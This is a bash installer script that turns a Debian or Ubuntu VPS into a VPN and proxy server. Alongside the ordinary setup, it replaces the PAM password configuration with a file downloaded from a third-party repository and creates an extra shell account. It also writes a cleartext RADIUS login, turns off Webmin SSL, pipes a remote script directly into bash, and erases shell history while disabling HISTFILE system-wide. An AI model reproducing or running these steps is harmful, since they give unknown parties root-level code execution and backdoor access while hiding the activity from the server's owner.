#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
if ! [[ -e /etc/debian_version ]]; then
	echo For DEBIAN and UBUNTU only.
	exit;fi
function squi {
read -p "Shareable RP [Y]es [N]o : " shr
[[ ! $shr =~ Y|y|N|n ]] && squi
}; squi
# OPENVPN SERVER SETTINGS
mkdir /etc/openvpn 2> /dev/null
cd /etc/openvpn;mkdir log 2> /dev/null
wget "https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/openvpn_X-DCB.tar.gz" -qO- | tar xz
wget -qO- https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/1194.conf > 1194.conf
chmod -R a+x {script,keys}
function chvar {
. script/config.sh
[[  `cat script/config.sh` =~ "$1" ]] || echo "$1=" >> script/config.sh
if [[ ${!1} == '' ]];then
          echo $2
          while [[ $ccx == '' ]];do
          read -p "$3: " ccx;done;
          sed -i "/$1/{s/=.*/=$ccx/g}" script/config.sh; fi; ccx=''
. script/config.sh
}
chvar CPASS "Provide a password for downloading the client configuration." "Set Password"
chvar OWNER "Your name as Owner of this server." "Set Owner"
MYIP=$(wget -qO- ipv4.icanhazip.com);rpstat='';shre='#http_access'
[[ $shr =~ N|n ]] && shre='http_access' && rpstat=' not'
# UPDATE SOURCE LIST
OPT='-o Acquire::Check-Valid-Until=false -yq -o DPkg::Options::=--force-confdef -o DPkg::Options::=--force-confnew --allow-unauthenticated'

# initializing var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";

# company name details
country=MY
state=MY
locality=Malaysia
organization=Personal
organizationalunit=Personal
commonname=RangersVPN
email=rangersvpn@gmail.com

if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi
if [[ ! -e /dev/net/tun ]]; then
echo "TUN is not available"
exit 3
fi
echo "
AUTOSCRIPT BY RANGERSVPN

PLEASE CANCEL ALL PACKAGE POPUP

TAKE NOTE !!!"
clear
echo "START AUTOSCRIPT"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6

COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
REMOVE SPAM PACKAGE

COMPLETE 10%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
apt-get -y install wget curl

clear
echo "
UPDATE AND UPGRADE PROCESS

PLEASE WAIT TAKE TIME 1-5 MINUTE
"
# set repo
echo 'deb http://download.webmin.com/download/repository sarge contrib' >> /etc/apt/sources.list.d/webmin.list
wget "http://www.dotdeb.org/dotdeb.gpg"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update
apt-get -y install nginx
apt-get -y install nano iptables-persistent dnsutils screen whois ngrep unzip unrar
echo "
INSTALLER PROCESS PLEASE WAIT

TAKE TIME 5-10 MINUTE
"
# script
wget -O /usr/local/bin/menu "https://raw.githubusercontent.com/kingmapualaut/gakod/main/menu"
wget -O /usr/local/bin/m "https://raw.githubusercontent.com/kingmapualaut/gakod/main/menu"
wget -O /usr/local/bin/autokill "https://raw.githubusercontent.com/kingmapualaut/gakod/main/autokill"
wget -O /usr/local/bin/user-generate "https://raw.githubusercontent.com/kingmapualaut/gakod/main/user-generate"
wget -O /usr/local/bin/speedtest "https://raw.githubusercontent.com/kingmapualaut/gakod/main/speedtest"
wget -O /usr/local/bin/user-lock "https://raw.githubusercontent.com/kingmapualaut/gakod/main/user-lock"
wget -O /usr/local/bin/user-unlock "https://raw.githubusercontent.com/kingmapualaut/gakod/main/user-unlock"
wget -O /usr/local/bin/auto-reboot "https://raw.githubusercontent.com/kingmapualaut/gakod/main/auto-reboot"
wget -O /usr/local/bin/user-password "https://raw.githubusercontent.com/kingmapualaut/gakod/main/user-password"
wget -O /usr/local/bin/trial "https://raw.githubusercontent.com/kingmapualaut/gakod/main/trial"
wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/kingmapualaut/gakod/main/common-password"
chmod +x /etc/pam.d/common-password
chmod +x /usr/local/bin/menu
chmod +x /usr/local/bin/m
chmod +x /usr/local/bin/autokill 
chmod +x /usr/local/bin/user-generate 
chmod +x /usr/local/bin/speedtest 
chmod +x /usr/local/bin/user-unlock
chmod +x /usr/local/bin/user-lock
chmod +x /usr/local/bin/auto-reboot
chmod +x /usr/local/bin/user-password
chmod +x /usr/local/bin/trial

# fail2ban & exim & protection
apt-get install -y grepcidr
apt-get install -y libxml-parser-perl
apt-get -y install tcpdump fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
cd ddos-deflate-master && ./install.sh
service exim4 stop;sysv-rc-conf exim4 off;

# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
# ssh
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net "https://raw.githubusercontent.com/kingmapualaut/gakod/main/banner"

# setting port ssh
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=444/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
/etc/init.d/dropbear restart

# install squid
sq=$([ -d /etc/squid ] && echo squid || echo squid3)
[ ! -f /etc/$sq/squid.confx ] && mv /etc/$sq/squid.conf /etc/$sq/squid.confx
wget -qO- https://raw.githubusercontent.com/X-DCB/Unix/master/openvpn/squid.conf | sed -e "s/#http_access/$shre/g" | sed -e "s/x.x.x.x/$MYIP/g" > /etc/$sq/squid.conf

# install essential package
apt-get -y install nano iptables-persistent dnsutils screen whois ngrep unzip unrar

# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/kingmapualaut/gakod/main/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>SETUP BY ARA PM +601126996292</pre>" > /home/vps/public_html/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/kingmapualaut/gakod/main/vps.conf"

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://raw.githubusercontent.com/vpn82882/my/main/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/vpn82882/my/main/rc.local"
chmod +x /etc/rc.local

# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/vpn82882/my/main/client.ovpn"
wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/kingmapualaut/gakod/main/client1.ovpn"
wget -O /etc/motd "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/rendum/motd"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;


# install badvpn
cd
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/kingmapualaut/gakod/main/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/kingmapualaut/gakod/main/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300

# install stunnel
apt-get install stunnel4 -y
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
[dropbear]
accept = 442
connect = 127.0.0.1:443
END

# make a certificate
openssl genrsa -out key.pem 2048
openssl req -new -x509 -key key.pem -out cert.pem -days 1095 \
-subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email"
cat key.pem cert.pem >> /etc/stunnel/stunnel.pem

# configure stunnel
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
/etc/init.d/stunnel4 restart

cd

# install vnstat gui
apt-get install vnstat
cd /home/vps/public_html/
wget http://www.sqweek.com/sqweek/files/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/eth0/venet0/g" config.php
sed -i "s/\$iface_list = array('venet0', 'sixxs');/\$iface_list = array('venet0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i "s/Internal/Internet/g" config.php
sed -i "/SixXS IPv6/d" config.php
service vnstat restart

echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;

clear
# freeradius
apt-get -y install freeradius
cat /dev/null > /etc/freeradius/users
echo "ara Cleartext-Password := ara" > /etc/freeradius/users
# Lock Dropbear Expired ID
wget -O /usr/local/bin/lockidexp.sh "https://raw.githubusercontent.com/ara-rangers/vps/master/lockidexp.sh"
chmod +x /usr/local/bin/lockidexp.sh
crontab -l > mycron
echo "1 8 * * * /usr/local/bin/lockidexp.sh" >> mycron
crontab mycron
rm mycron
# BlockTorrent
wget -O /usr/local/bin/BlockTorrentEveryReboot "https://raw.githubusercontent.com/kingmapualaut/gakod/main/BlockTorrentEveryReboot"
chmod +x /usr/local/bin/BlockTorrentEveryReboot
crontab -l > mycron
echo "@reboot /usr/local/bin/BlockTorrentEveryReboot" >> mycron
crontab mycron
rm mycron
# restart service
service stunnel4 restart
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service webmin restart
service squid restart
service fail2ban restart
service freeradius restart
clear

# softether
apt install build-essential -y;
cd && wget https://github.com/SoftEtherVPN/SoftEtherVPN_Stable/releases/download/v4.28-9669-beta/softether-vpnserver-v4.28-9669-beta-2018.09.11-linux-x64-64bit.tar.gz
tar xzf softether-vpnserver-v4.28-9669-beta-2018.09.11-linux-x64-64bit.tar.gz
clear
echo  -e "\033[31;7mNOTE: ANSWER 1 AND ENTER THREE TIMES FOR THE COMPILATION TO PROCEED\033[0m"
cd vpnserver && make && ./vpnserver start
mkdir /usr/local/vpnserver/
cd && mv vpnserver /usr/local && cd /usr/local/vpnserver/ && chmod 600 * && chmod 700 vpnserver && chmod 700 vpncmd
crontab -l > mycron
echo "@reboot /usr/local/vpnserver/vpnserver start" >> mycron
crontab mycron
rm mycron
/usr/local/vpnserver/vpnserver start
clear

# finishing
cd
chown -R www-data:www-data /home/vps/public_html
/etc/init.d/nginx restart
/etc/init.d/openvpn restart
/etc/init.d/cron restart
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/webmin restart
/etc/init.d/stunnel4 restart
/etc/init.d/squid start
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

# grep ports 
opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
stunnel4port="$(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
squidport="$(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}')"
nginxport="$(netstat -nlpt | grep -i nginx| grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"

# END SCRIPT ( RANGERSVPN )
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript VPS (RANGERSVPN)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo "POWER BY RANGERSVPN CALL +601126996292"  | tee -a log-install.txt
echo "nginx : http://$MYIP:80"   | tee -a log-install.txt
echo "Webmin : http://$MYIP:10000/"  | tee -a log-install.txt
echo "OpenVPN  : TCP 443 (client config : http://$MYIP/client.ovpn)"  | tee -a log-install.txt
echo "Badvpn UDPGW : 7300"   | tee -a log-install.txt
echo "Stunnel SSL/TLS : 442"   | tee -a log-install.txt
echo "Squid3 : 3128,3129,8080,8000,9999"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 444"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "AntiDDOS : [on]"  | tee -a log-install.txt
echo "Modify(@aramaiti85)AntiTorrent : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : type menu to check menu script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "RADIUS Authentication Settings:"  | tee -a log-install.txt
echo "Radius Server Hostname: 127.0.0.1"  | tee -a log-install.txt
echo "Radius Port: 1812 (UDP)"  | tee -a log-install.txt
echo "Shared Secret: testing123"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "SoftEtherVPN Port: 8888"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TAKE EFFECT !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
wget -qO- "https://raw.githubusercontent.com/X-DCB/Unix/master/banner" | bash
echo 'Your Squid Proxy is'$rpstat' shareable.'
echo -e 'Download the client configuration\nwith this password: '$CPASS
echo "Installation finished."
history -c
